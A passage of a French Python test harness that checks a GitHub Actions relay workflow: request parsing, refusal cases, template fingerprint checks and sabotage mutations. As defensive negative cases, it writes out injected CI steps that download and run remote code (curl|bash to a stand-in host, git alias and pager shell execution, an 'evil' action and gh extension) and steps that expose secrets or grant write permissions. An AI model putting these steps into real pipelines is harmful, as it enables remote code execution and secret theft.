            ① RÔLE — Le cœur de l'épreuve : ce que lit le joueur = ce que dit la demande (et la table pour le reste).
            ② CONTEXTE D'APPEL — `tour`, pour chaque demande valide qui lance.
            ③ ENTRÉE — `nom` du cas ; `branche` ; `demande` : le texte déposé ; `appel` : l'appel « gh workflow run ».
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — UNE valeur : la liste des écarts (vide : conforme). [rend: 1]
            ⑥ TRAITEMENT — arguments de gh lus strictement ; entrées contrôlées contre celles déclarées par le circuit des séries, défauts appliqués ; attendu calculé depuis la demande et la table ; pas « matrice », puis « Jouer la part » par ligne et « Rassembler » par série, chacun joué avec son environnement résolu ; lectures par `lire_les_arguments` du joueur et du rassembleur ; comparaison champ par champ.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Fiche en tête, ⑧ (le lot 262 arrêté, n°298).
            ⑨ CE QUI CLOCHE — L'horodatage du relevé est jugé par sa forme seulement (il dépend de l'heure). La conversion des types par GitHub est imitée (str).
            ⑩ EFFET — Écrit dans le dossier jetable du tour.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            ecarts = []
            a = appel["args"]
            if a[2:5] != [os.path.basename(F.CIRCUIT_SERIES), "--ref", branche] or (len(a) - 5) % 2:
                return [f"{nom} : gh workflow run mal formé : {a}"]
            if appel["repo"] != "essai/public" or appel["jeton"] != "jeton-fictif-du-passage":
                ecarts.append(f"{nom} : gh lancé sans le dépôt ou le jeton du passage")
            donnees = {}
            for k in range(5, len(a), 2):
                cle, egal, valeur = a[k + 1].partition("=")
                if a[k] != "-f" or not egal or cle in donnees:
                    return ecarts + [f"{nom} : argument de gh refusé (forme, ou entrée donnée deux fois) : {a[k:k + 2]}"]
                donnees[cle] = valeur
            # GitHub : entrées non déclarées refusées, choix hors liste refusés, nombres lus, défauts appliqués
            for cle, valeur in donnees.items():
                e = entrees.get(cle)
                if e is None:
                    return ecarts + [f"{nom} : entrée non déclarée par le circuit des séries : {cle}"]
                if e["options"] is not None and valeur not in e["options"]:
                    return ecarts + [f"{nom} : choix refusé par GitHub : {cle}={valeur}"]
                if e["type"] == "number" and not re.fullmatch(r"[0-9]+", valeur):
                    return ecarts + [f"{nom} : nombre illisible : {cle}={valeur}"]
            boutons = {cle: donnees.get(cle, e["default"]) for cle, e in entrees.items()}
            # l'attendu, depuis la demande (lue ici) et la table
            lu = dict(l.split("=", 1) for l in demande.split("\n") if l and not l.startswith("#"))
            if boutons.get("version") != branche:
                ecarts.append(f"{nom} : version {boutons.get('version')}, attendue {branche}")
            choisies = sorted(ref) if lu["serie"] == "toutes" else [lu["serie"]]
            attendu = {s: (ref[s][0], int(lu.get(f"parts_{s.lower()}", ref[s][1])),
                           int(lu.get(f"lot_{s.lower()}", ref[s][2])), ref[s][3]) for s in choisies}
            # le pas matrice, avec les entrées du bouton
            rt = tempfile.mkdtemp(prefix="rt_matrice_", dir=d)
            sortie = os.path.join(rt, "sortie")
            contexte = {f"inputs.{k}": v for k, v in boutons.items()}
            env = dict(GIT_ENV, PATH=outils + os.pathsep + os.environ["PATH"], GITHUB_OUTPUT=sortie, RUNNER_TEMP=rt,
                       **resoudre(env_matrice, contexte))
            c, o = lancer(["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", "-c", script_matrice], env=env,
                          cwd=version)
            if c != 0:
                return ecarts + [f"{nom} : pas matrice code {c} : {o[-300:]}"]
            sorties = dict(l.split("=", 1) for l in open(sortie, encoding="utf-8").read().split("\n") if "=" in l)
            matrice, series = json.loads(sorties["matrice"]), json.loads(sorties["series"])
            # chaque ligne de matrice → « Jouer la part » → lecture du joueur
            par_serie = {}
            for ligne in matrice:
                rt = tempfile.mkdtemp(prefix="rt_part_", dir=d)
                journal = os.path.join(rt, "unshare.jsonl")
                contexte = {f"matrix.{k}": v for k, v in ligne.items()}
                contexte["runner.temp"] = rt
                env = dict(GIT_ENV, PATH=outils + os.pathsep + os.environ["PATH"], RUNNER_TEMP=rt,
                           FAUX_UNSHARE_JOURNAL=journal, FAUX_UNSHARE_CODE="0", **resoudre(env_jouer, contexte))
                lancer(["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", "-c", script_jouer], env=env, cwd=rt)
                commandes = [json.loads(l) for l in open(journal, encoding="utf-8")] if os.path.exists(journal) else []
                if len(commandes) != 1 or commandes[0][:5] != ["-rn", "python3", "-B", "-u", JOUEUR]:
                    return ecarts + [f"{nom} : « Jouer la part » n'a pas lancé le joueur une fois : {commandes}"]
                try:
                    lus = J.lire_les_arguments(commandes[0][5:])
                except ValueError as e:
                    return ecarts + [f"{nom} : le joueur refuse sa ligne de commande : {e}"]
                if lus["racine"] != os.path.realpath(os.path.join(rt, "depot")) or \
                        lus["travail"] != os.path.realpath(os.path.join(rt, "travail")):
                    ecarts.append(f"{nom} : racine ou travail du joueur : {lus['racine']}, {lus['travail']}")
                serie = ligne.get("serie")
                par_serie.setdefault(serie, []).append(lus)
            if sorted(par_serie) != sorted(attendu):
                ecarts.append(f"{nom} : séries jouées {sorted(par_serie)}, attendues {sorted(attendu)}")
            for s, lus_s in par_serie.items():
                if s not in attendu:
                    continue
                epreuve, n, lot, modele = attendu[s]
                motif = re.escape(modele).replace(r"\*", HORODATAGE)
                if sorted(x["part"] for x in lus_s) != list(range(n)):
                    ecarts.append(f"{nom} : série {s} : parts lues {sorted(x['part'] for x in lus_s)}, attendues 0..{n - 1}")
                for x in lus_s:
                    vu = (x["epreuve"], x["nb_parts"], x["lot"])
                    if vu != (epreuve, n, lot) or not re.fullmatch(motif, x["releve"]):
                        ecarts.append(f"{nom} : série {s} : le joueur lit {vu}, {x['releve']} ; attendu "
                                      f"{(epreuve, n, lot)}, {modele}")
                        break
                if len({x["releve"] for x in lus_s}) != 1:
                    ecarts.append(f"{nom} : série {s} : plusieurs relevés pour une série")
            # chaque série → « Rassembler » → lecture du rassembleur
            for ligne in series:
                rt = tempfile.mkdtemp(prefix="rt_rass_", dir=d)
                journal = os.path.join(rt, "unshare.jsonl")
                contexte = {f"matrix.{k}": v for k, v in ligne.items()}
                contexte.update({"runner.temp": rt, "needs.preparer.outputs.sha": "f" * 40})
                env = dict(GIT_ENV, PATH=outils + os.pathsep + os.environ["PATH"], RUNNER_TEMP=rt,
                           FAUX_UNSHARE_JOURNAL=journal, FAUX_UNSHARE_CODE="2", GITHUB_RUN_ID="1",
                           **resoudre(env_rass, contexte))
                lancer(["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", "-c", script_rass], env=env, cwd=rt)
                commandes = [json.loads(l) for l in open(journal, encoding="utf-8")] if os.path.exists(journal) else []
                if len(commandes) != 1 or commandes[0][:5] != ["-rn", "python3", "-B", "-u", RASSEMBLEUR]:
                    ecarts.append(f"{nom} : « Rassembler » n'a pas lancé le rassembleur une fois : {commandes}")
                    continue
                try:
                    lus = R.lire_les_arguments(commandes[0][5:])
                except ValueError as e:
                    ecarts.append(f"{nom} : le rassembleur refuse sa ligne de commande : {e}")
                    continue
                if lus["depuis"] != os.path.realpath(os.path.join(rt, "parts")) or \
                        lus["travail"] != os.path.realpath(os.path.join(rt, "rassemble")):
                    ecarts.append(f"{nom} : série {ligne.get('serie')} : le rassembleur lit depuis={lus['depuis']}, "
                                  f"travail={lus['travail']}")
                parts_s = par_serie.get(ligne.get("serie")) or [{}]
                if (lus["epreuve"], lus["releve"]) != (parts_s[0].get("epreuve"), parts_s[0].get("releve")):
                    ecarts.append(f"{nom} : série {ligne.get('serie')} : le rassembleur lit {lus['epreuve']}, "
                                  f"{lus['releve']} ; les parts {parts_s[0].get('epreuve')}, {parts_s[0].get('releve')}")
            return ecarts

        # V : les demandes valides
        for nom, branche, demande in VALIDES:
            c, o, appels = relayer(branche, [(NOM, demande.encode())])
            a_blanc = "a_blanc=oui" in demande
            if c != 0 or len(lances(appels)) != (0 if a_blanc else 1):
                faux.append(f"{nom} : relais code {c}, {len(lances(appels))} lancement(s) : {o[-300:]}")
                continue
            listes = [x["args"] for x in appels if x["args"][:2] == ["run", "list"]]
            if len(listes) != 1 or listes[0][2:4] != ["--workflow", os.path.basename(F.CIRCUIT_SERIES)]:
                faux.append(f"{nom} : le relais n'a pas regardé les passages du circuit des séries : {listes}")
            if a_blanc:
                if "A BLANC" not in o or "parts_hl 5 ; lot_hl 9" not in o:
                    faux.append(f"{nom} : le journal à blanc ne dit pas les valeurs : {o[-300:]}")
                continue
            faux += suivre(nom, branche, demande, lances(appels)[0])
        # V0 (tour 2, I-1) : le bouton « Run workflow » appuyé SANS relais, aucune entrée donnée sauf la version : les
        # valeurs par défaut DÉCLARÉES par le circuit des séries doivent mener le joueur aux valeurs de la table (et T0
        # confronte la table au témoin). Le relais passe toujours toutes les valeurs : sans ce cas, les défauts du bouton
        # n'étaient jamais exercés.
        faux += suivre("V0 bouton sans relais", "main", "serie=" + str(entrees.get("serie", {}).get("default")),
                       {"args": ["workflow", "run", os.path.basename(F.CIRCUIT_SERIES), "--ref", "main", "-f",
                                 "version=main"], "repo": "essai/public", "jeton": "jeton-fictif-du-passage"})
        # P : les demandes piégées, chacune refusée pour sa raison, rien de lancé
        def refus(nom, attendu, c, o, appels):
            """Range parmi les cas faux une demande piégée qui n'est pas refusée pour sa raison.

            ① RÔLE — Juger un cas P.
            ② CONTEXTE D'APPEL — `tour`, pour chaque cas P.
            ③ ENTRÉE — `nom` ; `attendu` : un fragment du message de refus ; `c`, `o`, `appels` : ce que rend `relayer`.
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — Aucune valeur : ajoute à `faux`. [rend: rien]
            ⑥ TRAITEMENT — faux si code nul, ou un lancement, ou pas de « DEMANDE REFUSEE », ou pas le fragment.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Un refus pour une AUTRE raison masquerait une garde retirée (mesuré par S15 : sans le contrôle ASCII, l'accent est encore refusé, par le motif de la ligne).
            ⑨ CE QUI CLOCHE — —
            ⑩ EFFET — Ajoute à la liste `faux` du tour.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            if c == 0 or lances(appels) or "DEMANDE REFUSEE" not in o or attendu not in o:
                faux.append(f"{nom} : code {c}, {len(lances(appels))} lancement(s), message : {o.strip()[-200:]!r}")

        for nom, demande, attendu in PIEGEES:
            refus(nom, attendu, *relayer("main", [(NOM, demande.encode("utf-8"))]))
        refus("P21 deux fichiers dans le commit", "UN seul fichier",
              *relayer("main", [(NOM, b"serie=HL\n"), ("programmes/X.py", b"x = 1\n")]))
        refus("P22 deux commits dans la poussée", "plus d'un commit",
              *relayer("main", [(NOM, b"serie=HL\n")], autres_commits=1))
        refus("P23 nom hors de demandes/SERIE_<date>.txt", "nom refuse",
              *relayer("main", [("demandes/serie.txt", b"serie=HL\n")]))
        refus("P24 fichier modifié, non ajouté", "pas ajoute", *relayer("main", [(NOM, b"serie=Yahoo\n")], modifier=True))
        refus("P25 branche créée par la poussée", "pointe d'avant",
              *relayer("main", [(NOM, b"serie=HL\n")], nouvelle_branche=True))
        refus("P26 branche qui n'est pas une version", "branche", *relayer("autre", [(NOM, b"serie=HL\n")]))
        for etat in ("in_progress", "queued", "waiting", "pending", "requested"):   # N1 de Cowork (tour 2)
            refus(f"P27 un passage des séries « {etat} »", "en cours",
                  *relayer("main", [(NOM, b"serie=HL\n")], en_cours=json.dumps([{"status": "completed"}, {"status": etat}])))
        # (tour 3, C7 de Cowork) un passage ancien en attente derrière 30 passages récents finis : il doit être vu
        refus("P29 un passage en attente derrière 30 passages finis", "en cours",
              *relayer("main", [(NOM, b"serie=HL\n")], en_cours=json.dumps([{"status": "completed"}] * 30 + [{"status": "queued"}])))
        # (tour 3, C3 de Cowork) une demande d'exactement 1 000 octets passe
        mille = b"circuit=series\nserie=HL\n"
        mille += b"#" * (1000 - len(mille) - 1) + b"\n"
        c, o, appels = relayer("main", [(NOM, mille)])
        if len(mille) != 1000 or c != 0 or len(lances(appels)) != 1:
            faux.append(f"V6 demande de 1000 octets : longueur {len(mille)}, code {c}, {len(lances(appels))} lancement(s) : {o[-150:]}")
        # G (tour 3, N5, N6, N7 de Cowork) : les réglages du GABARIT du relais, que l'empreinte ne garde pas (elle dit
        # seulement « publié = fabriqué ») : déclencheur unique sur demandes/, machine de GitHub, clonage à deux commits
        # sans jeton gardé, et gh employé seulement pour « run list » et « workflow run »
        for nom, motif in (("G1 déclencheur push sur demandes/ seulement", r'\non:\n  push:\n    paths:\n      - "demandes/\*\*"\nconcurrency:'),
                           ("G2 machine de GitHub", r"\n    runs-on: ubuntu-latest\n"),
                           ("G3 clonage à deux commits, sans jeton gardé", r"\n          fetch-depth: 2\n          persist-credentials: false\n")):
            if len(re.findall(motif, F.RELAIS)) != 1:
                faux.append(f"{nom} : le gabarit du relais ne porte plus ce réglage")
        usages = sorted(set(re.findall(r"\bgh ([a-z]+ [a-z]+)", F.RELAIS)))
        if usages != ["run list", "workflow run"] or len(re.findall(r"runs-on:", F.RELAIS)) != 1:
            faux.append(f"G4 gh employé autrement que « run list » et « workflow run », ou plus d'un job : {usages}")
        # E : l'examen de certification à la demande (décision de Jean-Luc du 08-11-2026 à 18h06, « Ok vas y ») — une
        # ligne de plus dans CIRCUITS_DU_RELAIS ; la valeur « circuit=examen » doit arriver au bouton de l'examen, et à
        # lui seul, depuis main seulement, sans réglage
        certification = os.path.basename(F.CIRCUIT_CERTIFICATION)
        on_cert = F.CERTIFICATION.split("\non:\n", 1)[1].split("\nconcurrency:", 1)[0] if "\non:\n" in F.CERTIFICATION else ""
        if not re.search(r"^  workflow_dispatch:", on_cert, re.M) or re.search(r"required: true", on_cert):
            faux.append("E0 le circuit de certification n'a pas de bouton sans entrée obligatoire")
        for nom, demande, a_blanc in (("E1 examen sur main", b"circuit=examen\n", False),
                                      ("E2 examen à blanc", b"a_blanc=oui\ncircuit=examen\n", True)):
            c, o, appels = relayer("main", [(NOM, demande)])
            attendus = [] if a_blanc else [["workflow", "run", certification, "--ref", "main"]]
            listes = [x["args"][2:4] for x in appels if x["args"][:2] == ["run", "list"]]
            if c != 0 or [x["args"] for x in lances(appels)] != attendus or listes != [["--workflow", certification]]:
                faux.append(f"{nom} : code {c}, lancements {[x['args'] for x in lances(appels)]}, run list {listes} : {o[-200:]}")
        refus("E3 examen depuis une version en attente", "ne se lance pas depuis",
              *relayer("travail-essai", [(NOM, b"circuit=examen\n")]))
        refus("E4 examen avec un réglage de série", "aucun reglage", *relayer("main", [(NOM, b"circuit=examen\nserie=HL\n")]))
        refus("E5 examen pendant un examen en attente", "en cours",
              *relayer("main", [(NOM, b"circuit=examen\n")], en_cours='[{"status": "queued"}]'))
        refus("E6 circuit inconnu", "circuit inconnu", *relayer("main", [(NOM, b"circuit=nuit\n")]))
        refus("E7 circuit absent", "circuit manque", *relayer("main", [(NOM, b"serie=HL\n")], circuit=False))
        # L : la lecture des arguments par le joueur et le rassembleur
        base = ["r", "tests/E.py", "tests/resultats/R.txt", "--part=0", "--nb-parts=2", "--travail=t"]
        for nom, args in (("L1 --lot donné deux fois (NV-2)", base + ["--lot=13", "--lot=11"]),
                          ("L2 --lot absent", base)):
            try:
                J.lire_les_arguments(args)
                faux.append(f"{nom} : accepté par le joueur")
            except ValueError:
                pass
        try:
            R.lire_les_arguments(["r", "e", "x", "--depuis=a", "--depuis=b", "--travail=t"])
            faux.append("L3 --depuis donné deux fois : accepté par le rassembleur")
        except ValueError:
            pass
        # F : le filet du fabricant
        def filet(nom, gabarits, raison):
            """Range parmi les cas faux un gabarit que le filet ne juge pas comme attendu.

            ① RÔLE — Juger un cas F.
            ② CONTEXTE D'APPEL — `tour`, pour chaque cas F.
            ③ ENTRÉE — `nom` ; `gabarits` : {nom : texte} ; `raison` : None (doit être accepté) ou un fragment du refus attendu.
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — Aucune valeur : ajoute à `faux`. [rend: rien]
            ⑥ TRAITEMENT — appelle `verifier_les_gabarits_publics` du fabricant éprouvé.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Chaque refus doit l'être pour SA raison (même motif que `refus`).
            ⑨ CE QUI CLOCHE — Le circuit du soir est passé vide : ses identités ne sont pas confrontées ici (l'épreuve du circuit public le fait).
            ⑩ EFFET — Ajoute à la liste `faux` du tour.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            try:
                F.verifier_les_gabarits_publics(gabarits, "")
                vu = "accepté"
            except ValueError as e:
                vu = str(e)
            if (raison is None and vu != "accepté") or (raison is not None and raison not in vu):
                faux.append(f"{nom} : {vu[:160]}")

        tous = {"certification": F.CERTIFICATION, "series": F.SERIES, "relais": F.RELAIS}
        filet("F0 gabarits fabriqués", tous, None)
        cle = "          GH_TOKEN: ${{ github.token }}\n"
        for nom, ancien, nouveau, raison in (
                ("F1 relais + une ligne qui porte la clé", cle, cle + "          J: ${{ secrets.JETON_DEPOTS }}\n",
                 "octet pour octet"),
                ("F2 relais + ${{ }} dans son script", "          export LC_ALL=C\n",
                 "          export LC_ALL=C\n          echo ${{ github.ref_name }}\n", "octet pour octet"),
                ("F3 relais + un programme du dépôt", "          export LC_ALL=C\n",
                 "          export LC_ALL=C\n          python3 programmes/X.py\n", "octet pour octet"),
                ("F4 relais + defaults:", "jobs:\n  relayer:\n",
                 "defaults:\n  shell: bash\njobs:\n  relayer:\n", "octet pour octet"),
                # tour 2 (I-2) : un cas par propriété de `verifier_un_relais`, chacun refusé pour SA raison
                ("F7 relais + un clonage du dépôt privé", "          persist-credentials: false\n",
                 "          persist-credentials: false\n          repository: " + F.DEPOT_PRIVE + "\n",
                 "octet pour octet"),
                ("F8 relais + run: sans bloc", "      - name: Lire la demande",
                 "      - name: X\n        shell: bash\n        run: echo x\n      - name: Lire la demande", "octet pour octet"),
                ("F9 relais + un pas run sans shell: bash", "      - name: Lire la demande",
                 "      - name: X\n        run: |\n          echo x\n      - name: Lire la demande", "octet pour octet"),
                ("F10 relais + GITHUB_ENV", "          export LC_ALL=C\n",
                 "          export LC_ALL=C\n          echo X=1 >> \"$GITHUB_ENV\"\n", "octet pour octet"),
                ("F11 relais + une poussée", "          export LC_ALL=C\n",
                 "          export LC_ALL=C\n          git push origin HEAD\n", "octet pour octet"),
                ("F12 second job aux pas indentés de huit (relecteur du tour 1, B1)", "jobs:\n  relayer:\n",
                 "jobs:\n  autre:\n    runs-on: ubuntu-latest\n    steps:\n        - name: X\n          shell: bash\n"
                 "          run: |\n            python3 programmes/X.py ${{ github.event.head_commit.message }}\n"
                 "  relayer:\n", "octet pour octet"),
                ("F13 relais + la clé écrite par un échappement YAML", "      - name: Lire la demande",
                 '      - name: "\\x73ecrets.JETON"\n        shell: bash\n        run: |\n          echo x\n'
                 "      - name: Lire la demande", "octet pour octet"),
                ("F14 relais + permissions au niveau du job", "    timeout-minutes: 10\n",
                 "    timeout-minutes: 10\n    permissions:\n      contents: write\n", "octet pour octet")):
            if F.RELAIS.count(ancien) != 1:
                faux.append(f"{nom} : texte cible trouvé {F.RELAIS.count(ancien)} fois dans le relais")
                continue
            filet(nom, dict(tous, relais=F.RELAIS.replace(ancien, nouveau)), raison)
        filet("F5 séries + actions: write", dict(tous, series=F.SERIES.replace(
            "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  actions: write\n", 1)),
            "octet pour octet")   # refusé par la condition du relais (`verifier_un_relais`) : ce n'est pas le relais
        filet("F6 séries + motif tapé HISTORIQUE_LONG (NV-1)", dict(tous, series=F.SERIES.replace(
            "          codes=", '          motif="HISTORIQUE_LONG"\n          codes=', 1)), "il nomme l'épreuve")
        # A (tour 3, superviseur R-759 du 08-11-2026) : ses essais, un second job ajouté au relais fabriqué ; chacun
        # REFUSÉ par l'empreinte (avant ce tour, A3, A4, A9, A10, A11, A13 et A5 passaient la liste de commandes)
        bis = lambda corps: F.RELAIS.rstrip("\n") + "\n  bis:\n    runs-on: ubuntu-latest\n    steps:\n" + corps
        for nom, texte in (
                ("A1 uses tiers", bis("      - uses: evil/act@v1\n")),
                ("A2 curl|bash", bis("      - shell: bash\n        run: |\n          curl -s https://x.example/p | bash\n")),
                ("A3 awk system", bis("      - shell: bash\n        run: |\n          awk 'BEGIN{system(\"curl x | bash\")}'\n")),
                ("A4 git alias !", bis("      - shell: bash\n        run: |\n          git -c alias.z='!curl x | bash' z\n")),
                ("A5 gh api et message du commit", bis("      - shell: bash\n        env:\n          M: ${{ github.event.head_commit.message }}\n"
                                                     "        run: |\n          gh api -X POST repos/x/y/issues -f body=\"$M\"\n")),
                ("A9 gh extension install", bis("      - shell: bash\n        run: |\n          gh extension install evil/gh-x && gh x\n")),
                ("A10 checkout tiers en flux + tar", bis("      - uses: actions/checkout@v5\n        with: {repository: evil/r, path: e}\n"
                                                       "      - shell: bash\n        run: |\n          tar -xf e/a.tar --to-command='sh -c x'\n")),
                ("A11 runs-on self-hosted", bis("      - shell: bash\n        run: |\n          true\n").replace(
                    "  bis:\n    runs-on: ubuntu-latest", "  bis:\n    runs-on: self-hosted")),
                ("A13 git core.pager", bis("      - shell: bash\n        run: |\n          git config --global core.pager 'sh -c x'; git log\n")),
                ("A14 une espace en fin de fichier", F.RELAIS + " ")):
            try:
                F.verifier_un_relais("demande_de_serie.yml", texte)
                faux.append(f"{nom} : relais modifié ACCEPTÉ")
            except ValueError as e:
                if "octet pour octet" not in str(e):
                    faux.append(f"{nom} : refusé pour une autre raison : {e}")
        try:
            F.verifier_un_relais("demande_de_serie.yml", F.RELAIS)
        except ValueError as e:
            faux.append(f"A0 le relais fabriqué refusé : {e}")
        # R (tour 3) : la permission de lancer, dans les circuits d'un clone public ; (fichier, texte, refusé ?)
        rel = os.path.basename(F.CIRCUIT_RELAIS)
        for nom, fichiers, attendu in (
                ("R1 les circuits fabriqués", {rel: F.RELAIS, "series_longues.yml": F.SERIES,
                                               "certifier_la_version.yml": F.CERTIFICATION}, 0),
                ("R2 le relais modifié", {rel: F.RELAIS.replace("timeout-minutes: 10", "timeout-minutes: 11")}, 1),
                ("R3 un autre circuit avec actions: write", {"autre.yml": "on: push\npermissions: {actions: write}\n"}, 1),
                ("R4 write-all", {"autre.yml": "on: push\npermissions: write-all\n"}, 1),
                ("R5 « actions »: « write » entre guillemets", {"autre.yaml": 'permissions:\n  "actions": "write"\n'}, 1),
                ("R6 une copie exacte du relais sous un autre nom", {"copie.yml": F.RELAIS}, 1),
                # tour 4 (Cowork, tour 3) : N9 un circuit sans « permissions: » ; N11 la casse
                ("R7 un circuit sans permissions: (réglage du dépôt)", {"autre.yml": "on: push\njobs: {}\n"}, 1),
                ("R8 « Actions: Write » en majuscules", {"autre.yml": "on: push\npermissions:\n  Actions: Write\n"}, 1)):
            pub = tempfile.mkdtemp(prefix="public_r_", dir=d)
            os.makedirs(os.path.join(pub, ".github", "workflows"))
            for f, texte in fichiers.items():
                open(os.path.join(pub, ".github", "workflows", f), "w", encoding="utf-8").write(texte)
            vu = F.refus_des_circuits_publies(pub)
            if len(vu) != attendu:
                faux.append(f"{nom} : {len(vu)} refus, {attendu} attendu(s) : {vu}")
    except Exception as e:   # noqa: BLE001 — une erreur imprévue est un cas faux, jamais un passage
        faux.append(f"erreur imprévue : {type(e).__name__} : {e}")
    finally:
        shutil.rmtree(d, ignore_errors=True)
    return faux


# LES SABOTAGES : un par passage, chacun intervertit deux valeurs (ou retire une garde) ; (fichier, ancien, nouveau)
# appliqués dans l'ordre à une copie ; chaque « ancien » doit s'y trouver exactement une fois.
SABOTAGES = {
    "S01_table_les_deux_series_echangent_leur_code": [
        (TABLE, '"code": "HL"', '"code": "TMP"'), (TABLE, '"code": "Yahoo"', '"code": "HL"'),
        (TABLE, '"code": "TMP"', '"code": "Yahoo"')],
    "S02_relais_parts_et_lot_intervertis_vers_gh": [
        (FABRICANT, '''-f "parts_%(m)s=$PARTS_%(M)s" -f "lot_%(m)s=$LOT_%(M)s''',
         '''-f "parts_%(m)s=$LOT_%(M)s" -f "lot_%(m)s=$PARTS_%(M)s''')],
    "S03_relais_lecture_parts_et_lot_intervertis": [
        (FABRICANT, '''              PARTS_%(M)s="$valeur"''', '''              TMP_%(M)s="$valeur"'''),
        (FABRICANT, '''              LOT_%(M)s="$valeur"''', '''              PARTS_%(M)s="$valeur"'''),
        (FABRICANT, '''              TMP_%(M)s="$valeur"''', '''              LOT_%(M)s="$valeur"''')],
    "S04_relais_defauts_intervertis": [
        (FABRICANT, '''          PARTS_%(M)s=%(n)d
          LOT_%(M)s=%(l)d''', '''          PARTS_%(M)s=%(l)d
          LOT_%(M)s=%(n)d''')],
    "S05_relais_version_toujours_main": [(FABRICANT, '''-f "version=$BRANCHE"''', '''-f "version=main"''')],
    "S06_matrice_entrees_parts_et_lot_interverties": [
        (FABRICANT, '"          PARTS_%s: ${{ inputs.parts_%s }}\\n          LOT_%s: ${{ inputs.lot_%s }}\\n"',
         '"          PARTS_%s: ${{ inputs.lot_%s }}\\n          LOT_%s: ${{ inputs.parts_%s }}\\n"')],
    "S07_matrice_n_et_l_intervertis": [
        (FABRICANT, '''n="${!vp}"; l="${!vl}"''', '''n="${!vl}"; l="${!vp}"''')],
    "S08_matrice_epreuves_interverties": [
        (FABRICANT, '''.value.serie_du_circuit.code == $c)''', '''.value.serie_du_circuit.code != $c)''')],
    "S09_jouer_nb_et_lot_intervertis": [
        (FABRICANT, '''          NB: ${{ matrix.nb_parts }}
          LOT: ${{ matrix.lot }}''', '''          NB: ${{ matrix.lot }}
          LOT: ${{ matrix.nb_parts }}''')],
    "S10_jouer_lot_donne_deux_fois_NV2": [
        (FABRICANT, '''--lot="$LOT" --parallele''', '''--lot="$LOT" --lot="$NB" --parallele''')],
    "S11_joueur_lit_nb_parts_et_lot_intervertis": [
        (JOUEUR, '''"nb_parts": int(opt["nb-parts"]), "lot": int(opt["lot"])''',
         '''"nb_parts": int(opt["lot"]), "lot": int(opt["nb-parts"])''')],
    "S12_joueur_accepte_une_option_en_double": [(JOUEUR, "        if nom in opt:\n", "        if False:\n")],
    "S13_rassembler_epreuve_et_releve_intervertis": [
        (FABRICANT, '''          EPREUVE: ${{ matrix.epreuve }}
          RELEVE: ${{ matrix.releve }}
          SERIE: ${{ matrix.serie }}''', '''          EPREUVE: ${{ matrix.releve }}
          RELEVE: ${{ matrix.epreuve }}
          SERIE: ${{ matrix.serie }}''')],
    "S14_rassembleur_lit_epreuve_et_releve_intervertis": [
        (RASSEMBLEUR, '''"epreuve": pos[1], "releve": pos[2],''', '''"epreuve": pos[2], "releve": pos[1],''')],
    "S15_relais_sans_controle_ascii": [(FABRICANT, '''          [ "$hors" = "0" ] ||''', '''          true ||''')],
    "S16_relais_accepte_une_cle_en_double": [(FABRICANT, '''            [[ "$vus" != *" $cle "* ]] ||''',
                                              '''            true ||''')],
    "S17_relais_sans_controle_un_seul_fichier": [
        (FABRICANT, '''          [ "$(printf '%s\\\\n' "$changes" | grep -c .)" = "1" ] ||''', '''          true ||''')],
    "S18_relais_sans_controle_un_seul_commit": [(FABRICANT, '''          [ "$parent" = "$AVANT" ] ||''',
                                                 '''          true ||''')],
    "S19_relais_sans_controle_passage_en_cours": [(FABRICANT, '''          [ "$en_cours" = "0" ] ||''',
                                                   '''          true ||''')],
    "S20_relais_a_blanc_ignore": [(FABRICANT, '''if [ "$A_BLANC" = "oui" ]; then''', '''if [ "$A_BLANC" = "jamais" ]; then''')],
    "S21_filet_actions_write_sans_condition": [(FABRICANT, "                verifier_un_relais(nom, texte)    #",
                                                "                pass    #")],
    "S22_filet_sans_les_souches_NV1": [(FABRICANT, "            if souche in texte:\n", "            if False:\n")],
    # tour 2 (relecture du 08-11-2026) : I-1, m-2, m-3, et une propriété de `verifier_un_relais` par sabotage (I-2)
    "S23_bouton_defauts_machines_et_lot_intervertis": [
        (FABRICANT, '% (c.lower(), c, n, c.lower(), c, l) for c, _, n, l in SERIES_DU_CIRCUIT',
         '% (c.lower(), c, l, c.lower(), c, n) for c, _, n, l in SERIES_DU_CIRCUIT')],
    "S24_rassembler_depuis_et_travail_intervertis": [
        (FABRICANT, '--depuis="$RUNNER_TEMP/parts" --travail="$RUNNER_TEMP/rassemble"',
         '--depuis="$RUNNER_TEMP/rassemble" --travail="$RUNNER_TEMP/parts"')],
    "S25_rassembleur_lit_depuis_et_travail_intervertis": [
        (RASSEMBLEUR, '"depuis": os.path.realpath(opt["depuis"]), "travail": os.path.realpath(opt["travail"]),',
         '"depuis": os.path.realpath(opt["travail"]), "travail": os.path.realpath(opt["depuis"]),')],
    "S26_relais_accepte_une_serie_non_jouee": [
        (FABRICANT, '[ "$SERIE" != "%(t)s" ] && [ "$SERIE" != "%(c)s" ]; then', '[ "$SERIE" = "jamais" ]; then')],
    # tour 3 (superviseur R-759 du 08-11-2026, « ARRÊTER ET SIMPLIFIER ») : les sabotages S27 à S36 du tour 2 visaient
    # la liste de commandes et la lecture de structure de `verifier_un_relais`, retirées ; à leur place, la propriété
    "S27_empreinte_du_relais_non_verifiee": [
        (FABRICANT, "    if EMPREINTE_DU_RELAIS is None or vue != EMPREINTE_DU_RELAIS:", "    if False:")],
    "S28_permission_de_lancer_admise_sous_tout_nom": [
        (FABRICANT, "            if f != os.path.basename(CIRCUIT_RELAIS):", "            if False:")],
    "S29_write_all_non_vu": [(FABRICANT, r"""write\b|\bwrite-all\b""", r"""write\b""")],
    "S30_circuits_publies_non_lus": [(FABRICANT, "        if not PERMISSION_DE_LANCER.search(texte):", "        if True:")],
    # l'examen à la demande (08-11-2026, 18h06) : séries et examen intervertis dans la table du relais ; l'examen admis
    # hors de main ; le compte des passages toujours pris sur le circuit des séries
    "S38_relais_series_et_examen_intervertis": [
